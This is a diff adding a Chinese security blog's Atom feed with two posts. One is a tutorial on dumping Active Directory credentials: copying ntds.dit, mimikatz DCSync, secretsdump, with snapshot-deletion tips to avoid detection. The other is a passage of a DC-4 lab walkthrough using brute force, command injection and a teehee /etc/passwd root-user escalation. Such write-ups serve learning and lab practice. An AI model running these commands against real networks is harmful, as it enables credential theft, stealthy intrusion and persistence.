@@ -1,0 +1,1487 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://f9f.fun</id>
+    <title>F9F</title>
+    <updated>2023-09-19T10:59:59.621Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://f9f.fun"/>
+    <link rel="self" href="https://f9f.fun/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://f9f.fun/images/avatar.png</logo>
+    <icon>https://f9f.fun/favicon.ico</icon>
+    <rights>All rights reserved 2023, F9F</rights>
+    <entry>
+        <title type="html"><![CDATA[内网学习-域控账号密码抓取]]></title>
+        <id>https://f9f.fun/post/nei-wang-xue-xi-yu-kong-zhang-hao-mi-ma-zhua-qu/</id>
+        <link href="https://f9f.fun/post/nei-wang-xue-xi-yu-kong-zhang-hao-mi-ma-zhua-qu/">
+        </link>
+        <updated>2023-09-19T10:58:51.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="内网学习-域控账号密码抓取">内网学习-域控账号密码抓取</h1>
+<figure data-type="image" tabindex="1"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826130802672.png" alt="image-20230826130802672" loading="lazy"></figure>
+<h2 id="域控账号密码文件ntds介绍">域控账号密码文件NTDS介绍</h2>
+<p>NTDS.DIT为DC的数据库，内容有域用户、域组、用户hash等信息，域控上的ntds.dit只有可以 登录到域控的用户（如域管用户、DC本地管理员用户）可以访问,为了进一步保护密码哈希值， 使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p>
+<p><strong>位置：C:\Windows\NTDS</strong></p>
+<figure data-type="image" tabindex="2"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826131503091.png" alt="image-20230826131503091" loading="lazy"></figure>
+<p>如果要读取该文件的内容有以下的几种方式：</p>
+<p>1、离线读取，将NTDS文件复制到攻击者的本地，然后使用工具读取</p>
+<p>问题：可能内存太大 传输过程很容易丢失 或者被杀软干掉 或者网络g了</p>
+<p>前提控制下域控</p>
+<p>2、在线读取，通过给域控的电脑上传读取的工具，进行在线读取</p>
+<p>弊端：工具需要免杀  前提控制下域控</p>
+<p>3、远程读取，不需要上线域控，可以通过Dcsync远程读取</p>
+<p>通过域内主机读取 走协议dcsync</p>
+<h2 id="使用卷影拷贝提取域控ntds">使用卷影拷贝提取域控NTDS</h2>
+<p>从Windows XP SP2和Windows Server 2003开始，微软就向Windows操作系统中引入了一项名叫卷 影拷贝的服务（Volume Shadow Copy Service-VSS）。</p>
+<p>这种服务允许Windows系统以自动或手动 的方式对文件或磁盘卷宗的当前状态进行备份（或快照），需要注意的是，在这个过程中，<strong>即使 文件处于打开状态下该服务仍然可以直接进行文件备份，</strong></p>
+<p>**Ntds.dit是默认被Windows系统锁定的，**想要读取该文件就要利用卷影拷贝服务(Volume Shadow  Copy Service，VSS)，得到Ntds.dit文件的副本。</p>
+<p><strong>卷影拷贝服务(VSS)本质上是属于快照技术的一种</strong>， 主要用于备份和恢复，即使目标文件被处于锁定状态。</p>
+<h3 id="关卷影拷贝的方式有很多我们介绍几种常用的">关卷影拷贝的方式有很多，我们介绍几种常用的</h3>
+<h3 id="一-ntdsutilexe工具进行拷贝">一、ntdsutil.exe工具进行拷贝</h3>
+<p>工具介绍：ntdsutil.exe是一个为活动目录提供管理机制的命令行工具，该工具默认安装在 域控服务器上，可以在域控制器上直接操作，2003、2008、2012、2016等，提取NTDS过 程分为3步</p>
+<figure data-type="image" tabindex="3"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826133936741.png" alt="image-20230826133936741" loading="lazy"></figure>
+<p><strong>我们先在本地进行测试</strong></p>
+<p>1、第一步：创建一个NTDS快照 命令：</p>
+<p>ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q Local Destination</p>
+<figure data-type="image" tabindex="4"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826134634738.png" alt="image-20230826134634738" loading="lazy"></figure>
+<p>2、第二步：加载快照到磁盘中</p>
+<p>命令： ntdsutil.exe snapshot &quot;mount {bf50c558-aa39-414d-9cc2-32e6dd3aebdc}&quot; q q</p>
+<figure data-type="image" tabindex="5"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826135549223.png" alt="image-20230826135549223" loading="lazy"></figure>
+<p>3、第三步：复制快照中的ntds.dit文件</p>
+<p>命令：copy '快照地址\Windows\NTDS\ntds.dit' 目标地址</p>
+<p>copy C:$SNAP_202209221446_VOLUMEC$\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds\ntds.dit</p>
+<figure data-type="image" tabindex="6"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826140123277.png" alt="image-20230826140123277" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826141325058.png" alt="image-20230826141325058" loading="lazy"></figure>
+<p>复制到桌面</p>
+<p>4、第四步：删除快照</p>
+<p>命令：</p>
+<p>ntdsutil.exe snapshot &quot;umount {bf50c558-aa39-414d-9cc2- 32e6dd3aebdc}&quot;    取消挂载</p>
+<p>&quot;delete {bf50c558-aa39-414d-9cc2-32e6dd3aebdc}&quot; q q  删除快照</p>
+<p>不然容易被发现</p>
+<h3 id="在cs上进行测试"><strong>在CS上进行测试</strong></h3>
+<p>1、第一步：创建一个NTDS快照（这里使用的administrator会出现如下的提示，我们可以 使用令牌将权限切换到system，或者借用administrator创建计划任务，但是计划任务比较麻烦需要多个任务 创建生成复制）</p>
+<p>命令： ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q</p>
+<figure data-type="image" tabindex="8"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826141839194.png" alt="image-20230826141839194" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826141913902.png" alt="image-20230826141913902" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826143208099.png" alt="image-20230826143208099" loading="lazy"></figure>
+<p>提到system</p>
+<p>2、第二步：加载快照到磁盘中</p>
+<p>命令： ntdsutil.exe snapshot &quot;mount {4c864d7c-1cff-4a91-9da0-fbefdaf6498e}&quot; q q</p>
+<p>可以看到快照的地址为C:$SNAP_202306171721_VOLUMEC$\</p>
+<figure data-type="image" tabindex="11"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826141946194.png" alt="image-20230826141946194" loading="lazy"></figure>
+<p>3、第三步：复制快照中的ntds.dit文件</p>
+<p>命令：copy '快照地址\Windows\NTDS\ntds.dit' 目标地址 copy C:$SNAP_202209221446_VOLUMEC$\Windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</p>
+<figure data-type="image" tabindex="12"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826142006615.png" alt="image-20230826142006615" loading="lazy"></figure>
+<p>4、第四步：删除快照</p>
+<p>命令：ntdsutil.exe snapshot &quot;umount {4c864d7c-1cff-4a91-9da0-fbefdaf6498e}&quot;  &quot;delete {4c864d7c-1cff-4a91-9da0-fbefdaf6498e}&quot; q q</p>
+<figure data-type="image" tabindex="13"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826142027878.png" alt="image-20230826142027878" loading="lazy"></figure>
+<h2 id="使用卷影拷贝提取域控ntds中">使用卷影拷贝提取域控NTDS(中)</h2>
+<h3 id="二-通过vssadmin工具进行拷贝">二、通过vssadmin工具进行拷贝</h3>
+<p>vssadmin是Windows Server 2008及Windows 7系统以上提供的VSS管理工具，它可以用于 创建或删除卷影副本，列出卷影副本的信息，他需要两步就可以进行提取NTDS文件</p>
+<figure data-type="image" tabindex="14"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826143940715.png" alt="image-20230826143940715" loading="lazy"></figure>
+<p><strong>我们先在本地进行测试</strong></p>
+<p>1、第一步：创建一个C盘快照</p>
+<p>命令： vssadmin create shadow /for=c:</p>
+<figure data-type="image" tabindex="15"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826144256452.png" alt="image-20230826144256452" loading="lazy"></figure>
+<p>2、第二步：将快照中的NTDS文件进行复制出来</p>
+<p>命令： copy  \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ ntds.dit C:\Users\Administrator\Desktop\ntds.dit</p>
+<figure data-type="image" tabindex="16"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145124523.png" alt="image-20230826145124523" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145134079.png" alt="image-20230826145134079" loading="lazy"></figure>
+<p><strong>我们CS进行测试</strong></p>
+<p>1、第一步：创建一个C盘快照 命令： vssadmin create shadow /for=c:</p>
+<figure data-type="image" tabindex="18"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145202623.png" alt="image-20230826145202623" loading="lazy"></figure>
+<p>2、第二步：将快照中的NTDS文件进行复制出来</p>
+<p>命令： copy  \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ ntds.dit C:\Users\Administrator\Desktop\ntds.dit</p>
+<figure data-type="image" tabindex="19"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145239260.png" alt="image-20230826145239260" loading="lazy"></figure>
+<p>最后一步就是删除快照</p>
+<p>命令： vssadmin delete shadows /for=c: /quiet</p>
+<figure data-type="image" tabindex="20"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145258450.png" alt="image-20230826145258450" loading="lazy"></figure>
+<h3 id="第三-ifm方式进行拷贝">第三、IFM方式进行拷贝</h3>
+<p>可以通过创建一个 IFM 的方式获取 ntds.dit，在使用 ntdsutil 创建媒体安装集（IFM）时， 需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作</p>
+<p>1、 ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</p>
+<figure data-type="image" tabindex="21"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145907891.png" alt="image-20230826145907891" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145915624.png" alt="image-20230826145915624" loading="lazy"></figure>
+<figure data-type="image" tabindex="23"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145924931.png" alt="image-20230826145924931" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826145932642.png" alt="image-20230826145932642" loading="lazy"></figure>
+<p>此时 ntds.dit 将被保存在 C:\test\Active  Directory 下，SYSTEN 和 SECURITY 两个 文件将被保存在 C:\test\registry 文件夹下</p>
+<p>cs上同理 需要system权限</p>
+<h2 id="使用卷影拷贝提取域控ntds下">使用卷影拷贝提取域控NTDS(下）</h2>
+<h3 id="第四-vssown提取ntdsdit"><strong>第四、vssown提取ntds.dit</strong></h3>
+<p>vssown 是一个 vbs 脚本,可以创建和删除卷影副本,使用方式如下</p>
+<figure data-type="image" tabindex="25"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826150652402.png" alt="image-20230826150652402" loading="lazy"></figure>
+<p>1、启动卷影复制服务</p>
+<p>命令： cscript vssown.vbs /start</p>
+<figure data-type="image" tabindex="26"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826150703507.png" alt="image-20230826150703507" loading="lazy"></figure>
+<p>2、创建一个C盘的卷影副本</p>
+<p>命令： cscript vssown.vbs /create c</p>
+<figure data-type="image" tabindex="27"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826150719277.png" alt="image-20230826150719277" loading="lazy"></figure>
+<p>3、列出当前卷影副本</p>
+<p>命令：cscript vssown.vbs /list</p>
+<p>4、复制文件到指定的目录</p>
+<p>命令：copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit  C:\Users\Administrator\Desktop\ntds.dit</p>
+<p>5、删除卷影副本</p>
+<p>命令：cscript vssown.vbs /delete {B267559B-57D8-4D59-B77F-890CF57BA448}</p>
+<h3 id="第五-copy-vssps1">第五、Copy-VSS.ps1</h3>
+<p>PS脚本可以直接导出</p>
+<p>Import-Module .\Copy-VSS.ps1 Copy-VSS</p>
+<p><strong>不想上传到受害机也可以直接在cs上导入使用</strong></p>
+<p>在cs的目录下然后powershell-import Copy-VSS.ps1</p>
+<p>powershell Copy-VSS</p>
+<p>直接导出</p>
+<h3 id="第六-invoke-ninjacopy">第六、 Invoke-NinjaCopy</h3>
+<p>Invoke-NinjaCopy也是PS脚本可以直接导出NTDS和system文件</p>
+<p>命令： Import-Module -name .\Invoke-NinjaCopy.ps1</p>
+<p>Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;c:\ntds.dit&quot;</p>
+<p>Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;c:\system.hiv&quot;</p>
+<figure data-type="image" tabindex="28"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826150929295.png" alt="image-20230826150929295" loading="lazy"></figure>
+<h2 id="离线读取ntds文件中的hash值">离线读取NTDS文件中的Hash值</h2>
+<p>离线一般需要两步：</p>
+<p>1、将远端域控的ntds.dit下载到本地，</p>
+<p>2、然后利用再在本地进行。</p>
+<p>注意：因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容 命令如下：reg save hklm\system c:\windows\temp\system.hive</p>
+<p>接下来我们读取里面的内容这里介绍几种方式，选择一个顺手的就行</p>
+<h3 id="第一种-secretsdumpexe-工具读取">第一种、secretsdump.exe 工具读取</h3>
+<figure data-type="image" tabindex="29"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826153220717.png" alt="image-20230826153220717" loading="lazy"></figure>
+<p>命令：secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</p>
+<figure data-type="image" tabindex="30"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826153154957.png" alt="image-20230826153154957" loading="lazy"></figure>
+<h3 id="第二种-ntdsdumpexexe工具读取">第二种、NTDSDumpEx.exe工具读取</h3>
+<p>命令： NTDSDumpEx -d ntds.dit -s system -o 1.txt</p>
+<figure data-type="image" tabindex="31"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826153920809.png" alt="image-20230826153920809" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230826154531519.png" alt="image-20230826154531519" loading="lazy"></figure>
+<p>只有账户hash没有机器用户hash</p>
+<h3 id="第三种-esedbexport工具读取">第三种、esedbexport工具读取</h3>
+<p>1、esedbexport是linux下的工具，先要在自己的linux机器上安装（centos）建议在python2环境下运行</p>
+<p>下载工具包（我已经提供）</p>
+<p>./configure</p>
+<p>make make</p>
+<p>install</p>
+<p>ldconfig</p>
+<p>2、 提取ntds文件内容</p>
+<p>esedbexport -m tables ntds.dit</p>
+<p>3、安装 ntdsxtract工具</p>
+<p>命令： 下载工具</p>
+<p>python setup.py build</p>
+<p>python setup.py install</p>
+<p>注意：如果提示 Import Error: No module named Crypto. Hash，请执行pip install pycryptodome</p>
+<p>4、将 ntds.dit. Export 和 SYSTEM 文件放入到 esedbexport工具的文件夹中，然后导出哈希值，最后 的结果将保存在 txt 里</p>
+<p>命令： 1、python dsusers.py datatable.4 link_table.7 output --syshive system.hive --passwordhashes -- pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee 1.txt 读取用户信息</p>
+<p>2、python dscomputers.py datatable.4 computer_output --csvoutfile 2.csv 读取机器信息</p>
+<h3 id="第四种-ds-internals工具读取">第四种、DS Internals工具读取</h3>
+<p>本工具是PS脚本，使用命令如下：</p>
+<p>1、安装DS Internals</p>
+<p>Install-Module DSInternals -Force安装方式（5.0版本）</p>
+<p>Import-Module .\DSInternals 导入方式（4.0版本）</p>
+<p>2、导出 hash，并保存在 txt 文件里</p>
+<p>$key = Get-Bootkey -SystemHivePath 'system.hiv' Get-ADDBAccount -All -DBPath 'ntds.dit' -Bootkey $key | Out-File 1.txt</p>
+<h2 id="在线读取ntds文件hash值">在线读取NTDS文件Hash值</h2>
+<p>在线的方式就是直接读取，不需要在导出ntds文件到自己的电脑中，直接用工具就可以读 取在线读取需要考虑几个问题：</p>
+<p>1、工具是否被杀软杀掉</p>
+<p>2、如果域太大读取时间太久容易死机</p>
+<h3 id="介绍几个方式在线读取">介绍几个方式在线读取</h3>
+<h3 id="第一种使用mimikatz">第一种:使用MimiKatz</h3>
+<figure data-type="image" tabindex="33"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831133236996.png" alt="image-20230831133236996" loading="lazy"></figure>
+<p>命令: lsadump::dcsync /domain:abc.com /all /csv(读取所有)</p>
+<p>命令: lsadump::dcsync /domain:abc.com /all /csv(读取所有)</p>
+<figure data-type="image" tabindex="34"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831134712970.png" alt="image-20230831134712970" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831134922425.png" alt="image-20230831134922425" loading="lazy"></figure>
+<figure data-type="image" tabindex="36"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831134940269.png" alt="image-20230831134940269" loading="lazy"></figure>
+<figure data-type="image" tabindex="37"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831134955735.png" alt="image-20230831134955735" loading="lazy"></figure>
+<figure data-type="image" tabindex="38"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831135022688.png" alt="image-20230831135022688" loading="lazy"></figure>
+<h3 id="第二种quarkspwdump工具">第二种:QuarksPWDump工具</h3>
+<p>命令: Quarks PW Dump.exe --dump-hash-domain --ntds-file ntds.dit</p>
+<p>Ntds这个文件必须先要导出来</p>
+<p>一些拷贝卷影 的方法把他拷贝出来</p>
+<figure data-type="image" tabindex="39"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831135758000.png" alt="image-20230831135758000" loading="lazy"></figure>
+<figure data-type="image" tabindex="40"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831135811635.png" alt="image-20230831135811635" loading="lazy"></figure>
+<figure data-type="image" tabindex="41"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831135829185.png" alt="image-20230831135829185" loading="lazy"></figure>
+<figure data-type="image" tabindex="42"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831135837486.png" alt="image-20230831135837486" loading="lazy"></figure>
+<figure data-type="image" tabindex="43"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230831135844294.png" alt="image-20230831135844294" loading="lazy"></figure>
+<h3 id="第三种secretsdump工具">第三种:secretsdump工具</h3>
+<p>命令: secretsdump.exe 域名/administrator:密码@IP -outfile f9f.txt</p>
+<p>远程读取的</p>
+<h3 id="第四种-invoke-dcsyncps1工具">第四种: Invoke-DCSync.ps1工具</h3>
+<p>命令:他是一个PS工具</p>
+<p>Import-Module .\Invoke-DCSync.ps1</p>
+<p>Invoke-DCSync</p>
+<figure data-type="image" tabindex="44"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230919183847587.png" alt="image-20230919183847587" loading="lazy"></figure>
+<h2 id="dcsync原理以及攻击">Dcsync原理以及攻击</h2>
+<p>什么是Dcsync（domain Controller synchronization ）域控同步:在内网中一般不是一个域控， 会有域树或者域森林等，域控之间是要同步数据的,不同的域控15分钟之间要发起一次数据同 步的请求，请求里面就包含同步的数据，这里采用的协议是DRS(目录复制服务)，这个就是 DCsync</p>
+<figure data-type="image" tabindex="45"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230919183918140.png" alt="image-20230919183918140" loading="lazy"></figure>
+<p>要运行这个DRS服务，需要什么用户才能运行呢？</p>
+<ol>
+<li>
+<p>Administrators组内的用户</p>
+</li>
+<li>
+<p>Domain Admins组内的用户</p>
+</li>
+<li>
+<p>Enterprise Admins组内的用户</p>
+</li>
+<li>
+<p>域控制器的计算机帐户</p>
+</li>
+</ol>
+<p>域控的Administrator 和 system 也可以</p>
+<p>使用可你加密存储密码是dcsync攻击的利用条件</p>
+<p><strong>Dcsync攻击：</strong></p>
+<p>2015 年 8 月，发布了新版本的 Mimikatz，新增加了 DCSync 功能。该功能可以 模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。该功能最 大的特点就是不用登陆域控制器，即可远程通过域数据同步复制的方式获得域控 制器上的的数据。</p>
+<p><strong>关于Dcsync的利用思路</strong></p>
+<p>1、找到有权限的用户，从而远程读取域控用户信息，可以进行PTH 黄金 白银票据攻击</p>
+<p>2、如果控制了域控，可以在域控添加一个管理员账号从而进行权限维持</p>
+<p>3、可以添加一个普通的用户，修改ACL从而实现可以使用Dcsync，进行权限维持</p>
+<h2 id="利用dcsync远程读取域控hash">利用Dcsync远程读取域控Hash</h2>
+<p>远程读取是利用dcsync，前提是必须找到拥有运行dcsync的账号，所以读取hash 的步骤是两步</p>
+<p>1、找到拥有dcsync的用户</p>
+<p>2、远程读取即可</p>
+<p><strong>读取方式一：</strong></p>
+<p>1、mimikatz</p>
+<p><strong>命令:</strong></p>
+<p>lsadump::dcsync /domain:abc.com /all /csv(读取所有)</p>
+<p>lsadump::dcsync /domain:abc.com /user:administrator（读取单个用户）</p>
+<p><strong>读取方式二：</strong></p>
+<p>第三种:secretsdump工具</p>
+<p>命令: secretsdump.exe 域名/用户名或者hash:密码@IP</p>
+<h2 id="利用dcsync远程读取明文账号">利用Dcsync远程读取明文账号</h2>
+<p>利用DCSync可以获取明文凭据，这是因为账户勾选了&quot;使用可逆加密存储密码的属性</p>
+<figure data-type="image" tabindex="46"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlfwlimage-20230919184832492.png" alt="image-20230919184832492" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[每周靶机渗透记录-DC4]]></title>
+        <id>https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc4/</id>
+        <link href="https://f9f.fun/post/mei-zhou-ba-ji-shen-tou-ji-lu-dc4/">
+        </link>
+        <updated>2023-09-08T12:25:48.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="dc4">DC4</h1>
+<h2 id="信息收集">信息收集</h2>
+<h3 id="1找靶机ip">1.找靶机ip</h3>
+<figure data-type="image" tabindex="1"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230511232947422.png" alt="image-20230511232947422" loading="lazy"></figure>
+<h3 id="2扫端口">2.扫端口</h3>
+<figure data-type="image" tabindex="2"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230511233019905.png" alt="image-20230511233019905" loading="lazy"></figure>
+<h3 id="3扫目录">3.扫目录</h3>
+<figure data-type="image" tabindex="3"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230511233150662.png" alt="image-20230511233150662" loading="lazy"></figure>
+<p>没扫出啥可能字典问题</p>
+<h3 id="4访问80端口">4.访问80端口</h3>
+<figure data-type="image" tabindex="4"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230511233219421.png" alt="image-20230511233219421" loading="lazy"></figure>
+<p>尝试了一下弱口令失败了</p>
+<p>直接burp爆破</p>
+<figure data-type="image" tabindex="5"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230511235116748.png" alt="image-20230511235116748" loading="lazy"></figure>
+<p>用的kali里面自带的john.lst</p>
+<p>看长度得出密码为happy  账号也是看页面猜的admin</p>
+<figure data-type="image" tabindex="6"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230511235309729.png" alt="image-20230511235309729" loading="lazy"></figure>
+<p>抓包</p>
+<figure data-type="image" tabindex="7"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230511235448851.png" alt="image-20230511235448851" loading="lazy"></figure>
+<h3 id="5存在命令执行漏洞">5.存在命令执行漏洞</h3>
+<figure data-type="image" tabindex="8"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230511235702901.png" alt="image-20230511235702901" loading="lazy"></figure>
+<p>尝试写入木马 写不进去文件</p>
+<p>失败了</p>
+<figure data-type="image" tabindex="9"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512140240189.png" alt="image-20230512140240189" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512140256116.png" alt="image-20230512140256116" loading="lazy"></figure>
+<p>发现jim sam 用的shell也是bash和root一样 可以用hydra爆破密码</p>
+<p>ssh远程链接</p>
+<figure data-type="image" tabindex="11"><img src="C:/Users/fwl/AppData/Roaming/Typora/typora-user-images/image-20230512141022521.png" alt="image-20230512141022521" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512145838525.png" alt="image-20230512145838525" loading="lazy"></figure>
+<h3 id="6反弹shell">6.反弹shell</h3>
+<figure data-type="image" tabindex="13"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512145921591.png" alt="image-20230512145921591" loading="lazy"></figure>
+<p>找到jim路径</p>
+<p>在路径下发现一个bak文件</p>
+<figure data-type="image" tabindex="14"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512145951153.png" alt="image-20230512145951153" loading="lazy"></figure>
+<p>复制到自己桌面文件里然后hydra爆破ssh密码</p>
+<p>jibril04</p>
+<figure data-type="image" tabindex="15"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512151355153.png" alt="image-20230512151355153" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512151434514.png" alt="image-20230512151434514" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512152053152.png" alt="image-20230512152053152" loading="lazy"></figure>
+<p>找到一封邮件</p>
+<p>嗨，Jim，</p>
+<p>我今天结束要去度假，所以老板让我把密码给你，以防出现问题。</p>
+<p>密码为：^xHhA&amp;hvim0y</p>
+<p>再见，</p>
+<p>查尔斯</p>
+<p>Charles 账户密码</p>
+<p>尝试jim用户提权</p>
+<figure data-type="image" tabindex="18"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512152314282.png" alt="image-20230512152314282" loading="lazy"></figure>
+<p>不行</p>
+<p>转Charles</p>
+<figure data-type="image" tabindex="19"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512152453854.png" alt="image-20230512152453854" loading="lazy"></figure>
+<p>小写charles</p>
+<figure data-type="image" tabindex="20"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512152531514.png" alt="image-20230512152531514" loading="lazy"></figure>
+<h3 id="提权一">提权一</h3>
+<p>发现teehee免密root权限密码</p>
+<p>利用teehee的root权限在passwd中写入一个免密的root权限用户</p>
+<p>echo &quot;fwl::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</p>
+<figure data-type="image" tabindex="21"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512153249633.png" alt="image-20230512153249633" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlimage-20230512153707632.png" alt="image-20230512153707632" loading="lazy"></figure>
+<h3 id="提权二">提权二</h3>
+<p>利用teehee往sudoers里写入charles ALL=(ALL:ALL) ALL 让charles用户可以无密码执行sudo</p>
+<p>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</p>
+<p>sudoer配置文件错误提权</p>
+<blockquote>
+<p>有的时候，普通用户经常要执行某个命令，但是经常需要sudo输入密码，我们就可以通过配置/etc/sudoers文件来实现普通用户某个命令权限的提升。但是如果一旦是给了用户写入root权限的命令，比如vi，那么这个普通用户一旦被入侵，就可以通过vi来提权</p>
+</blockquote>
+<p>解释一下payload中的参数， 如：<img src="https://f9f-1316728572.cos.ap-shanghai.myqcloud.com/fwlc0f482979abf4604998220b08e8b8b82.png" alt="img" loading="lazy"></p>
+<blockquote>
+<p>root：代表用户<br>
